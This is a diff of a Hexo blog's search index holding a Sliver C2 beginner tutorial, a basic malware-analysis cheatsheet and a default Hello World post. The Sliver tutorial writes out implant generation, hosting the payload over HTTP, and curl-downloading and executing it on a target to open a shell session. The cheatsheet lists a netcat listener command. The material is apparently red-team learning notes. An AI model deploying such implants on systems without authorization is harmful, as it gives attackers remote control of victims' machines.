@@ -1,199 +1,58 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>Basic Static and Dynamic Analysis cheatsheet</title>
-    <url>/2024/11/22/basic-static-and-dynamic-analysis/</url>
-    <content><![CDATA[<p>This cheatsheet is not indepth and detailed. It will only cover the required minimum<br>Might make a more indepth version when required.</p>
-<h2 id="Basic-Static-Analysis"><a href="#Basic-Static-Analysis" class="headerlink" title="Basic Static Analysis"></a>Basic Static Analysis</h2><ol>
-<li><strong>Malware Fingerprint</strong><ul>
-<li><strong>AV Scanning</strong><ul>
-<li>Hashing</li>
-<li>VirusTotal</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>Finding String in Malware</strong><ul>
-<li><strong>Representation of Strings</strong><ul>
-<li>ASCII (1 Byte), Hexadecimal</li>
-<li>Unicode (2 Bytes)</li>
-</ul>
-</li>
-<li><strong>BinText</strong>: String Extraction Tool</li>
-</ul>
-</li>
-<li><strong>Portable Executable Format</strong></li>
-<li><strong>Source to Execution</strong><ul>
-<li><strong>Compiler</strong>: Translates high-level code to machine code</li>
-<li><strong>Linker</strong>: Links <code>.obj</code> files into a single <code>.exe</code> executable</li>
-<li><strong>Loader</strong>: Allocates memory space and prepares the execution file</li>
-</ul>
-</li>
-<li><strong>Linking</strong><ul>
-<li><strong>Static Linking</strong>: Library copied into executable at start</li>
-<li><strong>Dynamic Linking</strong>: Searches and loads library at runtime</li>
-</ul>
-</li>
-<li><strong>Loading a PE</strong><ul>
-<li><strong>Absolute Loading</strong>: Same address</li>
-<li><strong>Relocatable Loading</strong>: Different address based on availability</li>
-<li><strong>Dynamic Run-time Loading</strong>: Different address while running</li>
-</ul>
-</li>
-<li><strong>Address Binding</strong>: Binding of Virtual Address to Physical Address<ul>
-<li>Relative Virtual Addresses</li>
-<li>Base Address</li>
-</ul>
-</li>
-<li><strong>PE File Format</strong><ul>
-<li><strong>PE Sections</strong><ul>
-<li><code>.edata</code> (Export Data)</li>
-<li><code>.reloc</code> (Base Relocation)</li>
-</ul>
-</li>
-<li><strong>Dependency Walker</strong>: See <code>.edata</code> &amp; <code>.idata</code></li>
-<li><strong>PEView</strong>: View files when compiled</li>
-</ul>
-</li>
-<li><strong>Packing Executable</strong><ul>
-<li><strong>PEiD</strong>: Detect packed PE<ul>
-<li><strong>PEiD Unpacker</strong>: Use plugins to unpack</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>Indicators of Malware</strong></li>
-</ol>
-<ul>
-<li><strong>Host-based Indicators</strong>: Affect the system (files, registry, process operations)</li>
-<li><strong>Network-based Indicators</strong>: Communicate with external IPs and URLs (Internet, socket operations)</li>
-</ul>
-<h2 id="Basic-Dynamic-Analysis"><a href="#Basic-Dynamic-Analysis" class="headerlink" title="Basic Dynamic Analysis"></a>Basic Dynamic Analysis</h2><ol>
-<li><strong>Running the Malware</strong><ul>
-<li><strong>Sandboxes</strong><ul>
-<li><strong>GFI Sandboxes</strong><ul>
-<li><strong>Mutex</strong>: Prevents multiple threads&#x2F;processes from accessing a resource</li>
-</ul>
-</li>
-<li><strong>Sandboxes Drawbacks</strong></li>
-</ul>
-</li>
-<li><strong>rundll32.exe</strong>: (Run DLL with export arguments)</li>
-</ul>
-</li>
-<li><strong>Process Monitoring</strong><ul>
-<li><strong>procmon</strong>: Historical monitoring</li>
-<li><strong>Process Explorer</strong>: Live monitoring</li>
-</ul>
-</li>
-<li><strong>Registry Monitoring</strong><ul>
-<li><strong>regshot</strong>: Compare registry before and after</li>
-<li><strong>CaptureBat</strong></li>
-</ul>
-</li>
-<li><strong>Network Monitoring</strong><ul>
-<li><strong>ApateDNS</strong>: Fake a network (127.0.0.1)<ul>
-<li>Change Local Host in TCP&#x2F;IP properties to <code>127.0.0.1</code></li>
-<li>Change DNS reply address in ApateDNS to <code>127.0.0.1</code></li>
-</ul>
-</li>
-<li><strong>NetCat</strong>: Command <code>nc -l -p 443</code> (-l is a lowercase L)</li>
-<li><strong>Wireshark</strong></li>
-</ul>
-</li>
-</ol>
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>Sliver-C2 Basic</title>
+      <link href="/2024/11/22/sliver-c2-basic/"/>
+      <url>/2024/11/22/sliver-c2-basic/</url>
+      
+        <content type="html"><![CDATA[<p>Sliver is an Open-Source Command and Control (C2) framework often used in penetration testing and red team operations. It offers robust features to deploy, manage, and interact with listener agents and payloads.</p><h3 id="Installation-of-Sliver"><a href="#Installation-of-Sliver" class="headerlink" title="Installation of Sliver"></a>Installation of Sliver</h3><p>Requirement for Sliver C2 is linux OS</p><p>Sliver Installation</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://sliver.sh/install | sudo bash</span><br></pre></td></tr></table></figure><p>Running Sliver</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sliver</span><br></pre></td></tr></table></figure><p>If Sliver process either hangs or inaccessable due to previous usage, use this command to restart you sliver process</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart sliver</span><br></pre></td></tr></table></figure><p>If you the issue persists, you can just use these 2 commands hand in hand</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start sliver.service</span><br><span class="line">sliver</span><br></pre></td></tr></table></figure><p>Before we continue application, we need a brief understanding of listeners, agents and payloads</p><p>A <strong>listener</strong> is a component that waits for incoming connections from compromised systems (agents). It acts as the communication channel between the operator and the agents.</p><p>Purpose: Facilitates secure communication between the attacker and compromised systems.</p><p>Common Protocols:</p><ul><li>HTTP&#x2F;S</li><li>DNS</li><li>TCP</li><li>Mutual TLS (mTLS)</li></ul><p>An <strong>agent</strong> is a piece of code executed on the target machine after exploitation, establishing a connection back to the listener.</p><p>Purpose: Executes commands, retrieves data, and maintains persistence on the target.</p><p>Features:</p><ul><li>Cross-platform support (Windows, Linux, macOS).</li><li>Configurable to evade detection (e.g., encoding or encryption).</li><li>Capable of dynamic command execution and lateral movement.</li></ul><p>A <strong>payload</strong> is the executable code delivered to the target system to deploy the agent.</p><p>Purpose: Bridges the gap between exploitation and establishing control over the system.</p><p>Types of Payloads:</p><ul><li>Staged: The payload downloads additional components (agent) after initial execution.</li><li>Stageless: The entire agent is contained within the payload, avoiding extra network activity.</li></ul><p>Delivery Methods:</p><ul><li>Standalone executables.</li><li>Memory injection.</li><li>Script-based (PowerShell, Bash).</li><li>Embedded in phishing documents or exploit kits.</li></ul><h3 id="Application-of-Sliver"><a href="#Application-of-Sliver" class="headerlink" title="Application of Sliver"></a>Application of Sliver</h3><p>Create a listener, this will be used to receive commands from agents</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mtls</span><br><span class="line">jobs</span><br></pre></td></tr></table></figure><p>Jobs will show what your current machine is listening for by ports or IPs</p><p>Now you would need to create your payload to be sent to the victim</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">generate --mtls &lt;LHOST_IP&gt; --save /tmp --skip-symbols --os linux</span><br><span class="line">LHOST_IP being your IP/Listener</span><br></pre></td></tr></table></figure><p>There are many ways to share your payload, however for this example we will be using a http server to host our agents. Go to a New Tab</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure><p>The file is now hosted on the LHOST_IP at port 8000, we should now download and run the agent on the endpoint (target). We will be using curl cuz yes</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -O http://&lt;LHOST_IP&gt;:&lt;LHOST_PORT&gt;/SESSION</span><br><span class="line">curl -O http://192.168.1.128:8000/RESIDENT_TUGBOAT</span><br><span class="line"></span><br><span class="line">ls -l</span><br><span class="line"></span><br><span class="line">chmod +x SESSION</span><br><span class="line">./SESSION</span><br></pre></td></tr></table></figure><p>Now that it has ran, we check and use the session if sliver heard it.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sessions</span><br><span class="line"></span><br><span class="line">use sessions</span><br></pre></td></tr></table></figure><p>Use help for more information on what can be done during a session &amp; then shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">help</span><br><span class="line">shell (not good practice)</span><br></pre></td></tr></table></figure><p>Congrats you have successfully installed an agent that connects to your C2 Server.</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Basic Static and Dynamic Analysis cheatsheet</title>
+      <link href="/2024/11/22/basic-static-and-dynamic-analysis/"/>
+      <url>/2024/11/22/basic-static-and-dynamic-analysis/</url>
+      
+        <content type="html"><![CDATA[<p>This cheatsheet is not indepth and detailed. It will only cover the required minimum<br>Might make a more indepth version when required.</p><h2 id="Basic-Static-Analysis"><a href="#Basic-Static-Analysis" class="headerlink" title="Basic Static Analysis"></a>Basic Static Analysis</h2><ol><li><strong>Malware Fingerprint</strong><ul><li><strong>AV Scanning</strong><ul><li>Hashing</li><li>VirusTotal</li></ul></li></ul></li><li><strong>Finding String in Malware</strong><ul><li><strong>Representation of Strings</strong><ul><li>ASCII (1 Byte), Hexadecimal</li><li>Unicode (2 Bytes)</li></ul></li><li><strong>BinText</strong>: String Extraction Tool</li></ul></li><li><strong>Portable Executable Format</strong></li><li><strong>Source to Execution</strong><ul><li><strong>Compiler</strong>: Translates high-level code to machine code</li><li><strong>Linker</strong>: Links <code>.obj</code> files into a single <code>.exe</code> executable</li><li><strong>Loader</strong>: Allocates memory space and prepares the execution file</li></ul></li><li><strong>Linking</strong><ul><li><strong>Static Linking</strong>: Library copied into executable at start</li><li><strong>Dynamic Linking</strong>: Searches and loads library at runtime</li></ul></li><li><strong>Loading a PE</strong><ul><li><strong>Absolute Loading</strong>: Same address</li><li><strong>Relocatable Loading</strong>: Different address based on availability</li><li><strong>Dynamic Run-time Loading</strong>: Different address while running</li></ul></li><li><strong>Address Binding</strong>: Binding of Virtual Address to Physical Address<ul><li>Relative Virtual Addresses</li><li>Base Address</li></ul></li><li><strong>PE File Format</strong><ul><li><strong>PE Sections</strong><ul><li><code>.edata</code> (Export Data)</li><li><code>.reloc</code> (Base Relocation)</li></ul></li><li><strong>Dependency Walker</strong>: See <code>.edata</code> &amp; <code>.idata</code></li><li><strong>PEView</strong>: View files when compiled</li></ul></li><li><strong>Packing Executable</strong><ul><li><strong>PEiD</strong>: Detect packed PE<ul><li><strong>PEiD Unpacker</strong>: Use plugins to unpack</li></ul></li></ul></li><li><strong>Indicators of Malware</strong></li></ol><ul><li><strong>Host-based Indicators</strong>: Affect the system (files, registry, process operations)</li><li><strong>Network-based Indicators</strong>: Communicate with external IPs and URLs (Internet, socket operations)</li></ul><h2 id="Basic-Dynamic-Analysis"><a href="#Basic-Dynamic-Analysis" class="headerlink" title="Basic Dynamic Analysis"></a>Basic Dynamic Analysis</h2><ol><li><strong>Running the Malware</strong><ul><li><strong>Sandboxes</strong><ul><li><strong>GFI Sandboxes</strong><ul><li><strong>Mutex</strong>: Prevents multiple threads&#x2F;processes from accessing a resource</li></ul></li><li><strong>Sandboxes Drawbacks</strong></li></ul></li><li><strong>rundll32.exe</strong>: (Run DLL with export arguments)</li></ul></li><li><strong>Process Monitoring</strong><ul><li><strong>procmon</strong>: Historical monitoring</li><li><strong>Process Explorer</strong>: Live monitoring</li></ul></li><li><strong>Registry Monitoring</strong><ul><li><strong>regshot</strong>: Compare registry before and after</li><li><strong>CaptureBat</strong></li></ul></li><li><strong>Network Monitoring</strong><ul><li><strong>ApateDNS</strong>: Fake a network (127.0.0.1)<ul><li>Change Local Host in TCP&#x2F;IP properties to <code>127.0.0.1</code></li><li>Change DNS reply address in ApateDNS to <code>127.0.0.1</code></li></ul></li><li><strong>NetCat</strong>: Command <code>nc -l -p 443</code> (-l is a lowercase L)</li><li><strong>Wireshark</strong></li></ul></li></ol>]]></content>
+      
+      
       <categories>
-        <category>Malware Analysis</category>
+          
+          <category> Malware Analysis </category>
+          
       </categories>
-      <tags>
-        <tag>Malware Analysis</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2024/11/20/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Sliver-C2 Basic</title>
-    <url>/2024/11/22/sliver-c2-basic/</url>
-    <content><![CDATA[<p>Sliver is an Open-Source Command and Control (C2) framework often used in penetration testing and red team operations. It offers robust features to deploy, manage, and interact with listener agents and payloads.</p>
-<h3 id="Installation-of-Sliver"><a href="#Installation-of-Sliver" class="headerlink" title="Installation of Sliver"></a>Installation of Sliver</h3><p>Requirement for Sliver C2 is linux OS</p>
-<p>Sliver Installation</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://sliver.sh/install | sudo bash</span><br></pre></td></tr></table></figure>
-
-<p>Running Sliver</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sliver</span><br></pre></td></tr></table></figure>
-
-<p>If Sliver process either hangs or inaccessable due to previous usage, use this command to restart you sliver process</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl restart sliver</span><br></pre></td></tr></table></figure>
-<p>If you the issue persists, you can just use these 2 commands hand in hand</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl start sliver.service</span><br><span class="line">sliver</span><br></pre></td></tr></table></figure>
-<p>Before we continue application, we need a brief understanding of listeners, agents and payloads</p>
-<p>A <strong>listener</strong> is a component that waits for incoming connections from compromised systems (agents). It acts as the communication channel between the operator and the agents.</p>
-<p>Purpose: Facilitates secure communication between the attacker and compromised systems.</p>
-<p>Common Protocols:</p>
-<ul>
-<li>HTTP&#x2F;S</li>
-<li>DNS</li>
-<li>TCP</li>
-<li>Mutual TLS (mTLS)</li>
-</ul>
-<p>An <strong>agent</strong> is a piece of code executed on the target machine after exploitation, establishing a connection back to the listener.</p>
-<p>Purpose: Executes commands, retrieves data, and maintains persistence on the target.</p>
-<p>Features:</p>
-<ul>
-<li>Cross-platform support (Windows, Linux, macOS).</li>
-<li>Configurable to evade detection (e.g., encoding or encryption).</li>
-<li>Capable of dynamic command execution and lateral movement.</li>
-</ul>
-<p>A <strong>payload</strong> is the executable code delivered to the target system to deploy the agent.</p>
-<p>Purpose: Bridges the gap between exploitation and establishing control over the system.</p>
-<p>Types of Payloads:</p>
-<ul>
-<li>Staged: The payload downloads additional components (agent) after initial execution.</li>
-<li>Stageless: The entire agent is contained within the payload, avoiding extra network activity.</li>
-</ul>
-<p>Delivery Methods:</p>
-<ul>
-<li>Standalone executables.</li>
-<li>Memory injection.</li>
-<li>Script-based (PowerShell, Bash).</li>
-<li>Embedded in phishing documents or exploit kits.</li>
-</ul>
-<h3 id="Application-of-Sliver"><a href="#Application-of-Sliver" class="headerlink" title="Application of Sliver"></a>Application of Sliver</h3><p>Create a listener, this will be used to receive commands from agents</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mtls</span><br><span class="line">jobs</span><br></pre></td></tr></table></figure>
-<p>Jobs will show what your current machine is listening for by ports or IPs</p>
-<p>Now you would need to create your payload to be sent to the victim</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">generate --mtls &lt;LHOST_IP&gt; --save /tmp --skip-symbols --os linux</span><br><span class="line">LHOST_IP being your IP/Listener</span><br></pre></td></tr></table></figure>
-
-<p>There are many ways to share your payload, however for this example we will be using a http server to host our agents. Go to a New Tab</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
-
-<p>The file is now hosted on the LHOST_IP at port 8000, we should now download and run the agent on the endpoint (target). We will be using curl cuz yes</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -O http://&lt;LHOST_IP&gt;:&lt;LHOST_PORT&gt;/SESSION</span><br><span class="line">curl -O http://192.168.1.128:8000/RESIDENT_TUGBOAT</span><br><span class="line"></span><br><span class="line">ls -l</span><br><span class="line"></span><br><span class="line">chmod +x SESSION</span><br><span class="line">./SESSION</span><br></pre></td></tr></table></figure>
-
-<p>Now that it has ran, we check and use the session if sliver heard it.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sessions</span><br><span class="line"></span><br><span class="line">use sessions</span><br></pre></td></tr></table></figure>
-
-<p>Use help for more information on what can be done during a session &amp; then shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">help</span><br><span class="line">shell (not good practice)</span><br></pre></td></tr></table></figure>
-
-<p>Congrats you have successfully installed an agent that connects to your C2 Server.</p>
-]]></content>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> Malware Analysis </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="/2024/11/20/hello-world/"/>
+      <url>/2024/11/20/hello-world/</url>
+      
+        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+  
+  
 </search>
